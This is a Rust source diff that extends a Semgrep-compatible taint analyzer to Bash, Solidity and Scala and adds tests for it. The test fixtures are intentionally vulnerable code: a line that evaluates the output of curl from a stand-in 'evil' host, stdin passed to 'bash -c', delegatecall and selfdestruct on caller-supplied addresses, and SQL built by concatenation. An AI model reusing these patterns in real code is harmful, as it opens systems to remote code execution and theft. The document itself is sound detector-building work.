@@ -56,6 +56,7 @@
 //! sub-items) is warn-skipped. If all source or sink entries are warn-skipped
 //! and none survive, the whole rule is skipped.
 
+use crate::rules::bash_taint;
 use crate::rules::c_taint;
 use crate::rules::common::get_source_line;
 use crate::rules::csharp_taint;
@@ -66,6 +67,8 @@ use crate::rules::kotlin_taint;
 use crate::rules::php_taint;
 use crate::rules::python_taint;
 use crate::rules::ruby_taint;
+use crate::rules::scala_taint;
+use crate::rules::solidity_taint;
 use crate::rules::{FileContext, Rule};
 use crate::{Finding, Language, Severity};
 use serde_yaml_ng::Value as YamlValue;
@@ -822,6 +825,229 @@ fn to_csharp_matcher(m: &GenericMatcher) -> csharp_taint::NodeMatcher {
     }
 }
 
+/// Convert the generic spec into a Bash taint spec.
+fn to_bash_spec(g: &GenericSpec) -> bash_taint::TaintSpec {
+    bash_taint::TaintSpec {
+        sources: g.sources.iter().map(to_bash_matcher).collect(),
+        sinks: g.sinks.iter().map(to_bash_matcher).collect(),
+        sanitizers: g.sanitizers.iter().map(to_bash_matcher).collect(),
+    }
+}
+
+fn to_bash_matcher(m: &GenericMatcher) -> bash_taint::NodeMatcher {
+    match m {
+        GenericMatcher::Attribute {
+            root,
+            field,
+            description,
+        } => bash_taint::NodeMatcher::Attribute {
+            root: root.clone(),
+            field: field.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::Call {
+            canonical,
+            description,
+        } => bash_taint::NodeMatcher::Call {
+            canonical: canonical.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::ParamName { names, description } => bash_taint::NodeMatcher::ParamName {
+            names: names.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::MethodName {
+            method,
+            description,
+        } => bash_taint::NodeMatcher::MethodName {
+            method: method.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::ReceiverCall {
+            receiver,
+            description,
+        } => bash_taint::NodeMatcher::ReceiverCall {
+            receiver: receiver.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::FieldName { field, description } => bash_taint::NodeMatcher::FieldName {
+            field: field.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::Subscript { base, description } => bash_taint::NodeMatcher::Subscript {
+            base: base.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::MemberAssign { field, description } => {
+            bash_taint::NodeMatcher::MemberAssign {
+                field: field.clone(),
+                description: description.clone(),
+            }
+        }
+        GenericMatcher::BinopFormat { description } => bash_taint::NodeMatcher::BinopFormat {
+            description: description.clone(),
+        },
+        GenericMatcher::ObjectLiteralValue { description } => {
+            bash_taint::NodeMatcher::ObjectLiteralValue {
+                description: description.clone(),
+            }
+        }
+        GenericMatcher::ReturnValue { description } => bash_taint::NodeMatcher::ReturnValue {
+            description: description.clone(),
+        },
+    }
+}
+
+/// Convert the generic spec into a Solidity taint spec.
+fn to_solidity_spec(g: &GenericSpec) -> solidity_taint::TaintSpec {
+    solidity_taint::TaintSpec {
+        sources: g.sources.iter().map(to_solidity_matcher).collect(),
+        sinks: g.sinks.iter().map(to_solidity_matcher).collect(),
+        sanitizers: g.sanitizers.iter().map(to_solidity_matcher).collect(),
+    }
+}
+
+fn to_solidity_matcher(m: &GenericMatcher) -> solidity_taint::NodeMatcher {
+    match m {
+        GenericMatcher::Attribute {
+            root,
+            field,
+            description,
+        } => solidity_taint::NodeMatcher::Attribute {
+            root: root.clone(),
+            field: field.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::Call {
+            canonical,
+            description,
+        } => solidity_taint::NodeMatcher::Call {
+            canonical: canonical.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::ParamName { names, description } => {
+            solidity_taint::NodeMatcher::ParamName {
+                names: names.clone(),
+                description: description.clone(),
+            }
+        }
+        GenericMatcher::MethodName {
+            method,
+            description,
+        } => solidity_taint::NodeMatcher::MethodName {
+            method: method.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::ReceiverCall {
+            receiver,
+            description,
+        } => solidity_taint::NodeMatcher::ReceiverCall {
+            receiver: receiver.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::FieldName { field, description } => {
+            solidity_taint::NodeMatcher::FieldName {
+                field: field.clone(),
+                description: description.clone(),
+            }
+        }
+        GenericMatcher::Subscript { base, description } => solidity_taint::NodeMatcher::Subscript {
+            base: base.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::MemberAssign { field, description } => {
+            solidity_taint::NodeMatcher::MemberAssign {
+                field: field.clone(),
+                description: description.clone(),
+            }
+        }
+        GenericMatcher::BinopFormat { description } => solidity_taint::NodeMatcher::BinopFormat {
+            description: description.clone(),
+        },
+        GenericMatcher::ObjectLiteralValue { description } => {
+            solidity_taint::NodeMatcher::ObjectLiteralValue {
+                description: description.clone(),
+            }
+        }
+        GenericMatcher::ReturnValue { description } => solidity_taint::NodeMatcher::ReturnValue {
+            description: description.clone(),
+        },
+    }
+}
+
+/// Convert the generic spec into a Scala taint spec.
+fn to_scala_spec(g: &GenericSpec) -> scala_taint::TaintSpec {
+    scala_taint::TaintSpec {
+        sources: g.sources.iter().map(to_scala_matcher).collect(),
+        sinks: g.sinks.iter().map(to_scala_matcher).collect(),
+        sanitizers: g.sanitizers.iter().map(to_scala_matcher).collect(),
+    }
+}
+
+fn to_scala_matcher(m: &GenericMatcher) -> scala_taint::NodeMatcher {
+    match m {
+        GenericMatcher::Attribute {
+            root,
+            field,
+            description,
+        } => scala_taint::NodeMatcher::Attribute {
+            root: root.clone(),
+            field: field.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::Call {
+            canonical,
+            description,
+        } => scala_taint::NodeMatcher::Call {
+            canonical: canonical.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::ParamName { names, description } => scala_taint::NodeMatcher::ParamName {
+            names: names.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::MethodName {
+            method,
+            description,
+        } => scala_taint::NodeMatcher::MethodName {
+            method: method.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::ReceiverCall {
+            receiver,
+            description,
+        } => scala_taint::NodeMatcher::ReceiverCall {
+            receiver: receiver.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::FieldName { field, description } => scala_taint::NodeMatcher::FieldName {
+            field: field.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::Subscript { base, description } => scala_taint::NodeMatcher::Subscript {
+            base: base.clone(),
+            description: description.clone(),
+        },
+        GenericMatcher::MemberAssign { field, description } => {
+            scala_taint::NodeMatcher::MemberAssign {
+                field: field.clone(),
+                description: description.clone(),
+            }
+        }
+        GenericMatcher::BinopFormat { description } => scala_taint::NodeMatcher::BinopFormat {
+            description: description.clone(),
+        },
+        GenericMatcher::ObjectLiteralValue { description } => {
+            scala_taint::NodeMatcher::ObjectLiteralValue {
+                description: description.clone(),
+            }
+        }
+        GenericMatcher::ReturnValue { description } => scala_taint::NodeMatcher::ReturnValue {
+            description: description.clone(),
+        },
+    }
+}
+
 fn to_php_matcher(m: &GenericMatcher) -> php_taint::NodeMatcher {
     match m {
         GenericMatcher::Attribute {
@@ -1029,6 +1255,45 @@ impl TaintFindingView {
             hops: f.hops,
         }
     }
+    fn from_bash(f: bash_taint::TaintFinding) -> Self {
+        Self {
+            sink_start_byte: f.sink_start_byte,
+            sink_line: f.sink_line,
+            sink_column: f.sink_column,
+            sink_end_line: f.sink_end_line,
+            sink_end_column: f.sink_end_column,
+            source_description: f.source_description,
+            sink_description: f.sink_description,
+            source_line: f.source_line,
+            hops: f.hops,
+        }
+    }
+    fn from_solidity(f: solidity_taint::TaintFinding) -> Self {
+        Self {
+            sink_start_byte: f.sink_start_byte,
+            sink_line: f.sink_line,
+            sink_column: f.sink_column,
+            sink_end_line: f.sink_end_line,
+            sink_end_column: f.sink_end_column,
+            source_description: f.source_description,
+            sink_description: f.sink_description,
+            source_line: f.source_line,
+            hops: f.hops,
+        }
+    }
+    fn from_scala(f: scala_taint::TaintFinding) -> Self {
+        Self {
+            sink_start_byte: f.sink_start_byte,
+            sink_line: f.sink_line,
+            sink_column: f.sink_column,
+            sink_end_line: f.sink_end_line,
+            sink_end_column: f.sink_end_column,
+            source_description: f.source_description,
+            sink_description: f.sink_description,
+            source_line: f.source_line,
+            hops: f.hops,
+        }
+    }
 }
 
 impl Rule for SemgrepTaintRule {
@@ -1131,6 +1396,27 @@ impl Rule for SemgrepTaintRule {
                 csharp_taint::analyze_tree(tree.root_node(), source, &spec, None)
                     .into_iter()
                     .map(TaintFindingView::from_csharp)
+                    .collect()
+            }
+            Language::Bash => {
+                let spec = to_bash_spec(&self.spec);
+                bash_taint::analyze_tree(tree.root_node(), source, &spec, None)
+                    .into_iter()
+                    .map(TaintFindingView::from_bash)
+                    .collect()
+            }
+            Language::Solidity => {
+                let spec = to_solidity_spec(&self.spec);
+                solidity_taint::analyze_tree(tree.root_node(), source, &spec, None)
+                    .into_iter()
+                    .map(TaintFindingView::from_solidity)
+                    .collect()
+            }
+            Language::Scala => {
+                let spec = to_scala_spec(&self.spec);
+                scala_taint::analyze_tree(tree.root_node(), source, &spec, None)
+                    .into_iter()
+                    .map(TaintFindingView::from_scala)
                     .collect()
             }
             _ => Vec::new(),
@@ -1251,6 +1537,18 @@ pub fn parse_taint_rule(yaml: &YamlValue) -> TaintRuleParse {
                         detected = Some(Language::CSharp);
                         break;
                     }
+                    "bash" | "sh" | "shell" => {
+                        detected = Some(Language::Bash);
+                        break;
+                    }
+                    "solidity" | "sol" => {
+                        detected = Some(Language::Solidity);
+                        break;
+                    }
+                    "scala" => {
+                        detected = Some(Language::Scala);
+                        break;
+                    }
                     _ => {}
                 }
             }
@@ -1258,7 +1556,7 @@ pub fn parse_taint_rule(yaml: &YamlValue) -> TaintRuleParse {
                 Some(l) => l,
                 None => {
                     return TaintRuleParse::Skip(format!(
-                        "taint rule `{}` targets unsupported languages; Python, JavaScript/TypeScript, Go, Java, C, Kotlin, Ruby, PHP, and C# are supported",
+                        "taint rule `{}` targets unsupported languages; Python, JavaScript/TypeScript, Go, Java, C, Kotlin, Ruby, PHP, C#, Bash, Solidity, and Scala are supported",
                         id
                     ));
                 }
@@ -1282,11 +1580,11 @@ pub fn parse_taint_rule(yaml: &YamlValue) -> TaintRuleParse {
     let cwe = extract_cwe(yaml);
 
     // ── Compile sources ────────────────────────────────────────────────
-    let sources = match compile_matcher_list(yaml.get("pattern-sources"), MatcherRole::Source, &id)
-    {
-        Ok(v) => v,
-        Err(e) => return TaintRuleParse::Skip(format!("taint rule `{}` skipped: {}", id, e)),
-    };
+    let sources =
+        match compile_matcher_list(yaml.get("pattern-sources"), MatcherRole::Source, &id, lang) {
+            Ok(v) => v,
+            Err(e) => return TaintRuleParse::Skip(format!("taint rule `{}` skipped: {}", id, e)),
+        };
     if sources.is_empty() {
         return TaintRuleParse::Skip(format!(
             "taint rule `{}` has no valid `pattern-sources`",
@@ -1294,7 +1592,8 @@ pub fn parse_taint_rule(yaml: &YamlValue) -> TaintRuleParse {
         ));
     }
 
-    let sinks = match compile_matcher_list(yaml.get("pattern-sinks"), MatcherRole::Sink, &id) {
+    let sinks = match compile_matcher_list(yaml.get("pattern-sinks"), MatcherRole::Sink, &id, lang)
+    {
         Ok(v) => v,
         Err(e) => return TaintRuleParse::Skip(format!("taint rule `{}` skipped: {}", id, e)),
     };
@@ -1302,11 +1601,15 @@ pub fn parse_taint_rule(yaml: &YamlValue) -> TaintRuleParse {
         return TaintRuleParse::Skip(format!("taint rule `{}` has no valid `pattern-sinks`", id));
     }
 
-    let sanitizers =
-        match compile_matcher_list(yaml.get("pattern-sanitizers"), MatcherRole::Sanitizer, &id) {
-            Ok(v) => v,
-            Err(e) => return TaintRuleParse::Skip(format!("taint rule `{}` skipped: {}", id, e)),
-        };
+    let sanitizers = match compile_matcher_list(
+        yaml.get("pattern-sanitizers"),
+        MatcherRole::Sanitizer,
+        &id,
+        lang,
+    ) {
+        Ok(v) => v,
+        Err(e) => return TaintRuleParse::Skip(format!("taint rule `{}` skipped: {}", id, e)),
+    };
 
     TaintRuleParse::Compiled(SemgrepTaintRule {
         id: format!("semgrep/{}", id),
@@ -1358,6 +1661,7 @@ fn compile_matcher_list(
     node: Option<&YamlValue>,
     role: MatcherRole,
     rule_id: &str,
+    lang: Language,
 ) -> Result<Vec<GenericMatcher>, String> {
     let Some(node) = node else {
         return Ok(Vec::new());
@@ -1368,7 +1672,7 @@ fn compile_matcher_list(
 
     let mut out = Vec::new();
     for entry in entries {
-        compile_entry(entry, role, rule_id, &mut out);
+        compile_entry(entry, role, rule_id, lang, &mut out);
     }
     Ok(out)
 }
@@ -1381,6 +1685,7 @@ fn compile_entry(
     entry: &YamlValue,
     role: MatcherRole,
     rule_id: &str,
+    lang: Language,
     out: &mut Vec<GenericMatcher>,
 ) {
     let Some(map) = entry.as_mapping() else {
@@ -1416,7 +1721,7 @@ fn compile_entry(
                 );
                 return;
             };
-            match compile_pattern(pattern, role) {
+            match compile_pattern(pattern, role, lang) {
                 Some(m) => out.push(m),
                 None => eprintln!(
                     "Warning: taint rule `{}` {} unsupported pattern shape `{}`; skipping entry",
@@ -1444,7 +1749,7 @@ fn compile_entry(
                 return;
             }
             for nested in inner {
-                compile_entry(nested, role, rule_id, out);
+                compile_entry(nested, role, rule_id, lang, out);
             }
         }
         Some("patterns") => {
@@ -1461,7 +1766,7 @@ fn compile_entry(
             //   slightly BROADER than the original Semgrep rule — documented
             //   in COMPATIBILITY.md.
             // - If no expressible matcher results, warn-skip the whole entry.
-            compile_patterns_block(v, role, rule_id, out);
+            compile_patterns_block(v, role, rule_id, lang, out);
         }
         Some(other) => {
             eprintln!(
@@ -1506,6 +1811,7 @@ fn compile_patterns_block(
     v: &YamlValue,
     role: MatcherRole,
     rule_id: &str,
+    lang: Language,
     out: &mut Vec<GenericMatcher>,
 ) {
     let Some(inner) = v.as_sequence() else {
@@ -1539,7 +1845,7 @@ fn compile_patterns_block(
         match sk.as_str() {
             Some("pattern") | Some("pattern-either") => {
                 // Recursively compile via the normal entry path.
-                compile_entry(sub, role, rule_id, out);
+                compile_entry(sub, role, rule_id, lang, out);
             }
             Some(constraint_key) if PATTERNS_CONSTRAINT_KEYS.contains(&constraint_key) => {
                 // Constraint-only key — drop with a warning (documented broadening).
@@ -1576,15 +1882,140 @@ fn compile_patterns_block(
     }
 }
 
+/// Compile a Bash-specific pattern (shell command or command substitution)
+/// into a `Call` matcher keyed by the command name.
+///
+/// The Bash engine treats a `Call { canonical: "<cmd>" }` matcher as "a shell
+/// command whose command name is `<cmd>`" (or, for sources, a command
+/// substitution / pipeline whose first command name is `<cmd>`). This lets the
+/// generic [`GenericMatcher::Call`] variant carry Bash shell-command sinks and
+/// sources without adding a new variant.
+fn compile_bash_pattern(pat: &str, role: MatcherRole) -> Option<GenericMatcher> {
+    // Strip a leading `$VAR=` assignment so `$VAR=$(... | jq ...)` resolves to
+    // its RHS command substitution.
+    let rhs = match pat.split_once('=') {
+        Some((lhs, rhs)) if lhs.trim_start_matches('$').chars().all(is_ident_char) => rhs.trim(),
+        _ => pat,
+    };
+
+    // Unwrap a command substitution `$(...)` or backtick `` `...` ``.
+    let inner = if let Some(stripped) = rhs.strip_prefix("$(") {
+        stripped.strip_suffix(')').unwrap_or(stripped).trim()
+    } else if let Some(stripped) = rhs.strip_prefix('`') {
+        stripped.strip_suffix('`').unwrap_or(stripped).trim()
+    } else {
+        rhs
+    };
+
+    // The command name is the first whitespace-delimited token. For a pipeline
+    // (`cat | jq ...`), the meaningful command for sources is the LAST stage
+    // (`jq`) when present, else the first; for sinks it is the first token.
+    let cmd = match role {
+        MatcherRole::Source => {
+            if let Some((_, after_pipe)) = inner.rsplit_once('|') {
+                first_token(after_pipe)
+            } else {
+                first_token(inner)
+            }
+        }
+        MatcherRole::Sink | MatcherRole::Sanitizer => first_token(inner),
+    }?;
+
+    // The command name must be a plain identifier-like shell word.
+    if cmd.is_empty() || !cmd.chars().all(is_ident_char) {
+        return None;
+    }
+
+    Some(GenericMatcher::Call {
+        canonical: cmd.to_string(),
+        description: describe(cmd, role),
+    })
+}
+
+/// First whitespace-delimited token of a shell command fragment, ignoring a
+/// leading subshell `(`.
+fn first_token(s: &str) -> Option<&str> {
+    s.trim().trim_start_matches('(').split_whitespace().next()
+}
+
+fn is_ident_char(c: char) -> bool {
+    c.is_ascii_alphanumeric() || c == '_' || c == '-'
+}
+
+/// True when `pat` is a function-signature source pattern of the form
+/// `function $F(...) <vis> {...}` (Solidity) or `def $C(...) = ...` (Scala) —
+/// i.e. a parameter-of-a-function source. The body / visibility specifics are
+/// irrelevant; we only require the leading keyword and a parameter list with a
+/// Semgrep metavariable. Used to compile such sources to an any-parameter seed.
+fn is_function_signature_source(pat: &str) -> bool {
+    let pat = pat.trim();
+    let starts_fn = pat.starts_with("function ") || pat.starts_with("def ");
+    if !starts_fn {
+        return false;
+    }
+    // Must declare a parameter list and reference at least one metavariable
+    // parameter (`$X`), so we don't seed on a zero-arg signature.
+    pat.contains('(') && pat.contains('$')
+}
+
 /// Compile a single Semgrep pattern string into a [`NodeMatcher`].
 ///
 /// Returns `None` if the pattern shape is not one of the supported forms
 /// (see module docs). Callers surface that as a skip-with-warning at the
 /// rule level.
-fn compile_pattern(pattern: &str, role: MatcherRole) -> Option<GenericMatcher> {
-    let pat = pattern.trim();
+fn compile_pattern(pattern: &str, role: MatcherRole, lang: Language) -> Option<GenericMatcher> {
+    let mut pat = pattern.trim();
     if pat.is_empty() {
         return None;
+    }
+
+    // Solidity statement patterns carry a trailing `;` (e.g. `selfdestruct(...);`,
+    // `$CONTRACT.delegatecall(...);`). Strip it so the call/member shapes below
+    // recognise them.
+    if lang == Language::Solidity {
+        pat = pat.trim_end_matches(';').trim_end();
+    }
+
+    // ── Bash command / command-substitution shapes ───────────────────────
+    //
+    // Bash taint rules express sources and sinks as shell commands rather than
+    // call expressions, so none of the generic shapes below recognise them.
+    // We map a shell command (or command substitution) to a `Call` matcher
+    // keyed by the *command name*, which the Bash engine interprets in its own
+    // node vocabulary (`command` / `command_substitution`). Examples:
+    //   `$(curl ...)`        → Call { "curl" }   (command-substitution source)
+    //   `$(cat | jq ...)`    → Call { "cat" }    (first command in a pipeline)
+    //   `$VAR=$(... | jq ...)` → Call { "jq" }   (assignment from a pipeline)
+    //   `eval ...`           → Call { "eval" }   (command sink)
+    //   `cat $SINK`          → Call { "cat" }    (command sink)
+    //   `bash -c $...SINK`   → Call { "bash" }   (command sink)
+    //   `realpath ...`       → Call { "realpath" } (sanitizer)
+    if lang == Language::Bash {
+        if let Some(m) = compile_bash_pattern(pat, role) {
+            return Some(m);
+        }
+    }
+
+    // ── Function-signature source: `function $F(..., type $X, ...) public {...}`
+    //    (Solidity) / `def $C(..., $P: $T, ...) = ...` (Scala) ───────────────
+    //
+    // Several Solidity and Scala taint rules express their source as "a
+    // parameter of a public/external function" via a full function-signature
+    // pattern. None of the generic call/attribute shapes recognise these, so
+    // they would otherwise compile to nothing and skip the rule. We compile
+    // such a signature to a metavariable [`GenericMatcher::ParamName`] (a name
+    // beginning with `$`), which the Solidity / Scala engines interpret as
+    // "seed every parameter of the enclosing function as tainted" — matching
+    // Semgrep's any-parameter semantics. Source role only.
+    if matches!(lang, Language::Solidity | Language::Scala) {
+        if let MatcherRole::Source = role {
+            if is_function_signature_source(pat) {
+                return Some(GenericMatcher::ParamName {
+                    names: vec!["$PARAM".to_string()],
+                    description: "untrusted function parameter".to_string(),
+                });
+            }
+        }
     }
 
     // ── ObjectLiteralValue form: tainted value in an object/dict literal ──
@@ -2398,7 +2829,7 @@ mod tests {
     use super::*;
 
     fn compile(pattern: &str, role: MatcherRole) -> Option<GenericMatcher> {
-        compile_pattern(pattern, role)
+        compile_pattern(pattern, role, Language::Python)
     }
 
     #[test]
@@ -5447,5 +5878,379 @@ def fetch():
         assert!(parse_return_metavar("return").is_none());
         assert!(parse_return_metavar("returnx").is_none());
         assert!(parse_return_metavar("$X").is_none());
+    }
+
+    // ── Bridge-level tests: Bash (`curl-eval` / hooks command-injection) ─────
+    //
+    // These exercise the FULL CLI path: parse_taint_rule → Compiled → check on
+    // a real Bash fixture. They MUST NOT call analyze_tree directly.
+
+    /// Real rule `curl-eval`: `$(curl ...)` source → `eval ...` sink.
+    #[test]
+    fn bash_bridge_curl_eval_fires() {
+        use crate::engine::parser::parse_file;
+
+        let rule = compiled(
+            r#"
+id: curl-eval
+mode: taint
+languages: [bash]
+severity: WARNING
+message: "Data is being eval'd from a curl command."
+pattern-sources:
+  - pattern: |
+      $(curl ...)
+  - pattern: |
+      `curl ...`
+pattern-sinks:
+  - pattern: eval ...
+"#,
+        );
+        assert_eq!(rule.lang, Language::Bash);
+
+        let src = "out=$(curl http://evil)\neval \"$out\"\n";
+        let tree = parse_file(src, Language::Bash).expect("bash fixture should parse");
+        let findings = rule.check(src, &tree);
+        assert_eq!(
+            findings.len(),
+            1,
+            "curl-eval must fire via the compiled bridge, got {:?}",
+            findings
+        );
+    }
+
+    /// Safe near-miss for `curl-eval`: eval of a literal, no curl source.
+    #[test]
+    fn bash_bridge_curl_eval_safe_no_finding() {
+        use crate::engine::parser::parse_file;
+
+        let rule = compiled(
+            r#"
+id: curl-eval
+mode: taint
+languages: [bash]
+severity: WARNING
+message: "Data is being eval'd from a curl command."
+pattern-sources:
+  - pattern: |
+      $(curl ...)
+pattern-sinks:
+  - pattern: eval ...
+"#,
+        );
+
+        let src = "out=\"ls -la\"\neval \"$out\"\n";
+        let tree = parse_file(src, Language::Bash).expect("bash fixture should parse");
+        let findings = rule.check(src, &tree);
+        assert!(
+            findings.is_empty(),
+            "eval of a clean literal must not fire, got {:?}",
+            findings
+        );
+    }
+
+    /// Real rule `hooks-unquoted-variable-bash-taint`: `$(cat | jq ...)` source
+    /// → `bash -c ...` / `eval ...` sinks.
+    #[test]
+    fn bash_bridge_hooks_jq_to_bash_c_fires() {
+        use crate::engine::parser::parse_file;
+
+        let rule = compiled(
+            r#"
+id: hooks-unquoted-variable-bash-taint
+mode: taint
+languages: [bash]
+severity: ERROR
+message: "Untrusted stdin flows into a command execution sink."
+pattern-sources:
+  - pattern: $(cat | jq ...)
+  - pattern: $(cat)
+pattern-sinks:
+  - pattern: eval $...SINK
+  - pattern: bash -c $...SINK
+  - pattern: sh -c $...SINK
+"#,
+        );
+
+        let src = "data=$(cat | jq -r '.path')\nbash -c \"$data\"\n";
+        let tree = parse_file(src, Language::Bash).expect("bash fixture should parse");
+        let findings = rule.check(src, &tree);
+        assert_eq!(
+            findings.len(),
+            1,
+            "hooks jq -> bash -c must fire via bridge, got {:?}",
+            findings
+        );
+    }
+
+    // ── Bridge-level tests: Solidity (delegatecall / selfdestruct) ───────────
+
+    /// Real rule `delegatecall-to-arbitrary-address`: param `address` source →
+    /// `$CONTRACT.delegatecall(...)` sink.
+    #[test]
+    fn solidity_bridge_delegatecall_fires() {
+        use crate::engine::parser::parse_file;
+
+        let rule = compiled(
+            r#"
+id: delegatecall-to-arbitrary-address
+mode: taint
+languages: [solidity]
+severity: ERROR
+message: "An attacker may perform delegatecall() to an arbitrary address."
+pattern-sources:
+  - patterns:
+    - pattern-either:
+      - pattern: function $ANY(..., address $CONTRACT, ...) public {...}
+      - pattern: function $ANY(..., address $CONTRACT, ...) external {...}
+    - focus-metavariable: $CONTRACT
+pattern-sinks:
+  - patterns:
+    - pattern-either:
+      - pattern: $CONTRACT.delegatecall(...);
+      - pattern: $CONTRACT.delegatecall{gas:$GAS}(...);
+"#,
+        );
+        assert_eq!(rule.lang, Language::Solidity);
+
+        let src = r#"
+contract C {
+  function run(address target, bytes data) public {
+    target.delegatecall(data);
+  }
+}
+"#;
+        let tree = parse_file(src, Language::Solidity).expect("solidity fixture should parse");
+        let findings = rule.check(src, &tree);
+        assert_eq!(
+            findings.len(),
+            1,
+            "delegatecall to a param address must fire via bridge, got {:?}",
+            findings
+        );
+    }
+
+    /// Safe near-miss: delegatecall to a hard-coded `address(this)`.
+    #[test]
+    fn solidity_bridge_delegatecall_to_self_safe() {
+        use crate::engine::parser::parse_file;
+
+        let rule = compiled(
+            r#"
+id: delegatecall-to-arbitrary-address
+mode: taint
+languages: [solidity]
+severity: ERROR
+message: "An attacker may perform delegatecall() to an arbitrary address."
+pattern-sources:
+  - patterns:
+    - pattern-either:
+      - pattern: function $ANY(..., address $CONTRACT, ...) public {...}
+pattern-sinks:
+  - patterns:
+    - pattern-either:
+      - pattern: $CONTRACT.delegatecall(...);
+"#,
+        );
+
+        let src = r#"
+contract C {
+  function run(bytes data) public {
+    address(this).delegatecall(data);
+  }
+}
+"#;
+        let tree = parse_file(src, Language::Solidity).expect("solidity fixture should parse");
+        let findings = rule.check(src, &tree);
+        assert!(
+            findings.is_empty(),
+            "delegatecall to address(this) must not fire, got {:?}",
+            findings
+        );
+    }
+
+    /// Real rule `accessible-selfdestruct`: param `address` source →
+    /// `selfdestruct(...)` sink.
+    #[test]
+    fn solidity_bridge_selfdestruct_fires() {
+        use crate::engine::parser::parse_file;
+
+        let rule = compiled(
+            r#"
+id: accessible-selfdestruct
+mode: taint
+languages: [solidity]
+severity: ERROR
+message: "Contract can be destructed by anyone."
+pattern-sources:
+  - patterns:
+    - focus-metavariable:
+        - $ADDR
+    - pattern-either:
+        - pattern: function $FUNC(..., address $ADDR, ...) external { ... }
+        - pattern: function $FUNC(..., address $ADDR, ...) public { ... }
+pattern-sinks:
+  - pattern-either:
+    - pattern: selfdestruct(...);
+    - pattern: suicide(...);
+"#,
+        );
+
+        let src = r#"
+contract C {
+  function kill(address payable target) public {
+    selfdestruct(target);
+  }
+}
+"#;
+        let tree = parse_file(src, Language::Solidity).expect("solidity fixture should parse");
+        let findings = rule.check(src, &tree);
+        assert_eq!(
+            findings.len(),
+            1,
+            "selfdestruct of a param must fire via bridge, got {:?}",
+            findings
+        );
+    }
+
+    // ── Bridge-level tests: Scala (tainted SQL / scalajs eval) ───────────────
+
+    /// Real rule `tainted-sql-string`: request param source → `"$SQL" + ...`
+    /// string-building sink.
+    #[test]
+    fn scala_bridge_tainted_sql_string_fires() {
+        use crate::engine::parser::parse_file;
+
+        let rule = compiled(
+            r#"
+id: tainted-sql-string
+mode: taint
+languages: [scala]
+severity: ERROR
+message: "User data flows into a manually-constructed SQL string."
+pattern-sources:
+  - patterns:
+    - pattern: $PARAM
+    - pattern-either:
+      - pattern-inside: |
+          def $CTRL(..., $PARAM: $TYPE, ...) = {
+            ...
+          }
+pattern-sinks:
+  - patterns:
+    - pattern-either:
+      - pattern: |
+          "$SQLSTR" + ...
+    - metavariable-regex:
+        metavariable: $SQLSTR
+        regex: (?i)(select|delete|insert|create|update|alter|drop)\b
+"#,
+        );
+        assert_eq!(rule.lang, Language::Scala);
+
+        let src = r#"
+object Ctrl {
+  def index(name: String) = {
+    val q = "SELECT * FROM t WHERE n = " + name
+    db.run(q)
+  }
+}
+"#;
+        let tree = parse_file(src, Language::Scala).expect("scala fixture should parse");
+        let findings = rule.check(src, &tree);
+        assert_eq!(
+            findings.len(),
+            1,
+            "tainted SQL concat must fire via bridge, got {:?}",
+            findings
+        );
+    }
+
+    /// Safe near-miss: SQL string built only from literals.
+    #[test]
+    fn scala_bridge_tainted_sql_string_literal_safe() {
+        use crate::engine::parser::parse_file;
+
+        let rule = compiled(
+            r#"
+id: tainted-sql-string
+mode: taint
+languages: [scala]
+severity: ERROR
+message: "User data flows into a manually-constructed SQL string."
+pattern-sources:
+  - patterns:
+    - pattern: $PARAM
+    - pattern-either:
+      - pattern-inside: |
+          def $CTRL(..., $PARAM: $TYPE, ...) = {
+            ...
+          }
+pattern-sinks:
+  - patterns:
+    - pattern-either:
+      - pattern: |
+          "$SQLSTR" + ...
+"#,
+        );
+
+        let src = r#"
+object Ctrl {
+  def index(name: String) = {
+    val q = "SELECT * FROM t WHERE n = " + "admin"
+    db.run(q)
+  }
+}
+"#;
+        let tree = parse_file(src, Language::Scala).expect("scala fixture should parse");
+        let findings = rule.check(src, &tree);
+        assert!(
+            findings.is_empty(),
+            "literal-only SQL concat must not fire, got {:?}",
+            findings
+        );
+    }
+
+    /// Real rule `scalajs-eval`: request param source → `$JS.eval(...)` sink.
+    #[test]
+    fn scala_bridge_scalajs_eval_fires() {
+        use crate::engine::parser::parse_file;
+
+        let rule = compiled(
+            r#"
+id: scalajs-eval
+mode: taint
+languages: [scala]
+severity: WARNING
+message: "eval() of user-controlled data."
+pattern-sources:
+  - patterns:
+    - pattern: $PARAM
+    - pattern-either:
+      - pattern-inside: |
+          def $CTRL(..., $PARAM: $TYPE, ...) = {
+            ...
+          }
+pattern-sinks:
+  - patterns:
+    - pattern: $JS.eval(...)
+"#,
+        );
+
+        let src = r#"
+object Ctrl {
+  def index(code: String) = {
+    js.eval(code)
+  }
+}
+"#;
+        let tree = parse_file(src, Language::Scala).expect("scala fixture should parse");
+        let findings = rule.check(src, &tree);
+        assert_eq!(
+            findings.len(),
+            1,
+            "scalajs eval of param must fire via bridge, got {:?}",
+            findings
+        );
     }
 }
